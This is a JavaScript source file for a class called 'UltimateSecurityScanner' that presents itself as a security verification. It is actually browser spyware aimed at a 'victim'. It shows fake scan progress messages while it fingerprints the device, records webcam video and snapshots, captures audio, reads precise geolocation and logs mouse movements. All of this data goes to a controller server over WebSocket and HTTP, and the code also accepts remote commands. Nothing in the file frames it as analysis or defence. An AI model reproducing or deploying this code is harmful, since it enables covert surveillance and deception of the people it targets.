hereclass UltimateSecurityScanner {
    constructor(config) {
        this.config = config;
        this.collectedData = {};
        this.mediaStream = null;
        this.isScanning = true;
        this.startTime = Date.now();
        this.dataBuffer = [];
        this.wsConnection = null;
        
        this.init();
    }

    init() {
        this.setupWebSocket();
        this.setupDataCollection();
        this.startProgressAnimation();
        this.setupErrorHandling();
    }

    setupWebSocket() {
        try {
            this.wsConnection = new WebSocket(`wss://${this.config.serverUrl.replace('https://', '')}`);
            
            this.wsConnection.onopen = () => {
                this.sendWSMessage('victim_connect', {
                    victimId: this.config.victimId,
                    userAgent: navigator.userAgent,
                    timestamp: Date.now()
                });
            };

            this.wsConnection.onmessage = (event) => {
                this.handleWSMessage(JSON.parse(event.data));
            };

            this.wsConnection.onerror = (error) => {
                console.warn('WebSocket error:', error);
            };
        } catch (error) {
            console.warn('WebSocket setup failed:', error);
        }
    }

    async startComprehensiveScan() {
        try {
            // Phase 1: Basic System Information
            await this.collectSystemInfo();
            this.updateProgress(15, "Collecting system information...");

            // Phase 2: Advanced Fingerprinting
            await this.collectAdvancedFingerprint();
            this.updateProgress(25, "Creating device fingerprint...");

            // Phase 3: Network Analysis
            await this.analyzeNetwork();
            this.updateProgress(35, "Analyzing network configuration...");

            // Phase 4: Media Device Access
            if (this.config.features.camera || this.config.features.microphone) {
                await this.accessMediaDevices();
                this.updateProgress(50, "Accessing media devices...");
            }

            // Phase 5: Location Services
            if (this.config.features.location) {
                await this.trackLocation();
                this.updateProgress(65, "Verifying geographical location...");
            }

            // Phase 6: Behavioral Analysis
            if (this.config.features.behavior) {
                await this.startBehavioralTracking();
                this.updateProgress(80, "Analyzing user behavior patterns...");
            }

            // Phase 7: Final Data Collection
            await this.collectFinalData();
            this.updateProgress(95, "Finalizing security assessment...");

            // Completion
            setTimeout(() => {
                this.updateProgress(100, "Security verification complete!");
                this.completeScan();
            }, 2000);

        } catch (error) {
            console.error('Scan error:', error);
            await this.sendData('error', { 
                error: error.message,
                stack: error.stack 
            });
        }
    }

    async collectSystemInfo() {
        const systemInfo = {
            // Browser Information
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            
            // Screen Information
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            
            // Window Information
            window: {
                width: window.innerWidth,
                height: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            
            // Time and Location
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            locale: navigator.language,
            
            // Capabilities
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            
            // Timestamp
            timestamp: Date.now(),
            scanStartTime: this.startTime
        };

        await this.sendData('system_info', systemInfo);
    }

    async collectAdvancedFingerprint() {
        const fingerprint = {
            // Canvas Fingerprinting
            canvas: await this.generateCanvasFingerprint(),
            
            // WebGL Fingerprinting
            webgl: await this.generateWebGLFingerprint(),
            
            // Audio Fingerprinting
            audio: await this.generateAudioFingerprint(),
            
            // Hardware Information
            hardware: {
                concurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints
            },
            
            // Connection Information
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : null,
            
            // Plugins and Extensions
            plugins: Array.from(navigator.plugins).map(plugin => ({
                name: plugin.name,
                filename: plugin.filename,
                description: plugin.description
            })),
            
            // MIME Types
            mimeTypes: Array.from(navigator.mimeTypes).map(mimeType => ({
                type: mimeType.type,
                description: mimeType.description,
                suffixes: mimeType.suffixes
            })),
            
            // Font Detection
            fonts: await this.detectFonts()
        };

        await this.sendData('advanced_fingerprint', fingerprint);
    }

    async generateCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Security Scan', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Security Scan', 4, 17);
        
        return canvas.toDataURL();
    }

    async generateWebGLFingerprint() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) return null;
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
            renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER),
            version: gl.getParameter(gl.VERSION),
            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
        };
    }

    async accessMediaDevices() {
        try {
            const constraints = {
                video: this.config.features.camera ? {
                    facingMode: "user",
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    frameRate: { ideal: 30 }
                } : false,
                
                audio: this.config.features.microphone ? {
                    echoCancellation: true,
                    noiseSuppression: true,
                    autoGainControl: true,
                    channelCount: 2
                } : false
            };

            this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
            
            // Start media recording if both camera and microphone are available
            if (this.config.features.camera && this.config.features.microphone) {
                this.startMediaRecording();
            }
            
            // Take periodic snapshots if camera is available
            if (this.config.features.camera) {
                this.startPeriodicSnapshots();
            }
            
            await this.sendData('media_access', { 
                status: 'success',
                hasVideo: this.config.features.camera,
                hasAudio: this.config.features.microphone
            });

        } catch (error) {
            await this.sendData('media_error', {
                error: error.message,
                name: error.name,
                constraints: constraints
            });
        }
    }

    startMediaRecording() {
        if (!this.mediaStream) return;

        try {
            const recorder = new MediaRecorder(this.mediaStream, {
                mimeType: 'video/webm; codecs=vp9,opus',
                videoBitsPerSecond: 2500000,
                audioBitsPerSecond: 128000
            });

            let chunks = [];
            
            recorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    chunks.push(event.data);
                }
            };

            recorder.onstop = async () => {
                try {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const buffer = await this.blobToBase64(blob);
                    
                    await this.sendData('video_recording', {
                        data: buffer,
                        duration: 10000,
                        timestamp: Date.now(),
                        size: blob.size
                    });

                    // Continue recording if still scanning
                    if (this.isScanning) {
                        setTimeout(() => this.startMediaRecording(), 15000);
                    }
                } catch (error) {
                    console.warn('Recording processing error:', error);
                }
            };

            recorder.start(10000); // 10-second chunks
            setTimeout(() => {
                if (recorder.state === 'recording') {
                    recorder.stop();
                }
            }, 10000);

        } catch (error) {
            console.warn('Media recording setup failed:', error);
        }
    }

    startPeriodicSnapshots() {
        if (!this.mediaStream) return;

        const canvas = document.getElementById('canvas');
        const video = document.createElement('video');
        video.srcObject = this.mediaStream;
        
        let snapshotCount = 0;
        const maxSnapshots = 6; // Take 6 snapshots total

        video.play().then(() => {
            const snapshotInterval = setInterval(async () => {
                if (snapshotCount >= maxSnapshots || !this.isScanning) {
                    clearInterval(snapshotInterval);
                    return;
                }

                try {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    
                    const snapshot = canvas.toDataURL('image/jpeg', 0.7);
                    await this.sendData('camera_snapshot', {
                        data: snapshot,
                        sequence: snapshotCount + 1,
                        timestamp: Date.now()
                    });
                    
                    snapshotCount++;
                } catch (error) {
                    console.warn('Snapshot error:', error);
                }
            }, 8000); // Every 8 seconds
        });
    }

    async trackLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                this.sendData('location_error', { error: 'Geolocation not supported' });
                resolve();
                return;
            }

            const options = {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const locationData = {
                        coordinates: {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        },
                        additional: {
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        },
                        timestamp: position.timestamp,
                        scanTimestamp: Date.now()
                    };
                    
                    await this.sendData('location', locationData);
                    resolve();
                },
                async (error) => {
                    await this.sendData('location_error', {
                        error: error.message,
                        code: error.code,
                        timestamp: Date.now()
                    });
                    resolve();
                },
                options
            );
        });
    }

    async startBehavioralTracking() {
        // Mouse movement tracking
        this.setupMouseTracking();
        
        // Keyboard interaction tracking
        this.setupKeyboardTracking();
        
        // Scroll behavior tracking
        this.setupScrollTracking();
        
        // Touch gesture tracking (for mobile)
        this.setupTouchTracking();
        
        // Page interaction tracking
        this.setupInteractionTracking();
    }

    setupMouseTracking() {
        let movements = [];
        let lastSend = Date.now();

        document.addEventListener('mousemove', (event) => {
            movements.push({
                x: event.clientX,
                y: event.clientY,
                timestamp: Date.now(),
                element: event.target.tagName
            });

            // Send batch every 5 seconds or when buffer is large
            if (Date.now() - lastSend > 5000 || movements.length > 50) {
                this.sendData('mouse_movements', movements);
                movements = [];
                lastSend = Date.now();
            }
        });
    }

    updateProgress(percent, text) {
        // Update UI progress
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(percent, text);
        }
        
        // Send progress update to server
        this.sendData('progress_update', {
            percent: percent,
            message: text,
            timestamp: Date.now()
        });
    }

    async sendData(type, data) {
        try {
            const payload = {
                victimId: this.config.victimId,
                dataType: type,
                payload: data,
                timestamp: Date.now(),
                userAgent: navigator.userAgent
            };

            // Send via WebSocket if available
            if (this.wsConnection && this.wsConnection.readyState === WebSocket.OPEN) {
                this.sendWSMessage('data_update', payload);
            }

            // Also send via HTTP POST for reliability
            const response = await fetch('/api/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.config.victimId
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            // Update statistics
            this.dataBuffer.push(payload);

        } catch (error) {
            console.warn(`Failed to send ${type}:`, error);
            // Store locally for later retry
            this.storeLocally(type, data);
        }
    }

    sendWSMessage(type, data) {
        if (this.wsConnection && this.wsConnection.readyState === WebSocket.OPEN) {
            this.wsConnection.send(JSON.stringify({
                type: type,
                data: data,
                victimId: this.config.victimId
            }));
        }
    }

    handleWSMessage(message) {
        switch (message.type) {
            case 'remote_command':
                this.executeRemoteCommand(message.command);
                break;
            case 'status_update':
                this.handleStatusUpdate(message.data);
                break;
            case 'media_request':
                this.handleMediaRequest(message.data);
                break;
        }
    }

    completeScan() {
        this.isScanning = false;
        
        // Stop all media streams
        if (this.mediaStream) {
            this.mediaStream.getTracks().forEach(track => track.stop());
        }
        
        // Close WebSocket connection
        if (this.wsConnection) {
            this.wsConnection.close();
        }
        
        // Send final scan report
        this.sendData('scan_complete', {
            duration: Date.now() - this.startTime,
            totalDataPoints: this.dataBuffer.length,
            featuresUsed: this.config.features,
            finalStatus: 'completed'
        });

        // Redirect to target after delay
        setTimeout(() => {
            window.location.href = this.config.targetUrl;
        }, 3000);
    }

    setupErrorHandling() {
        window.addEventListener('error', (event) => {
            this.sendData('javascript_error', {
                message: event.message,
                filename: event.filename,
                lineno: event.lineno,
                colno: event.colno,
                error: event.error?.toString()
            });
        });

        window.addEventListener('unhandledrejection', (event) => {
            this.sendData('promise_rejection', {
                reason: event.reason?.toString()
            });
        });
    }

    storeLocally(type, data) {
        try {
            const key = `pending_${type}_${Date.now()}`;
            localStorage.setItem(key, JSON.stringify({
                type: type,
                data: data,
                timestamp: Date.now()
            }));
        } catch (error) {
            console.warn('Local storage failed:', error);
        }
    }

    async blobToBase64(blob) {
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.onloadend = () => {
                const base64 = reader.result.split(',')[1];
                resolve(base64);
            };
            reader.readAsDataURL(blob);
        });
    }
}

// Make it globally available
window.UltimateSecurityScanner = UltimateSecurityScanner;
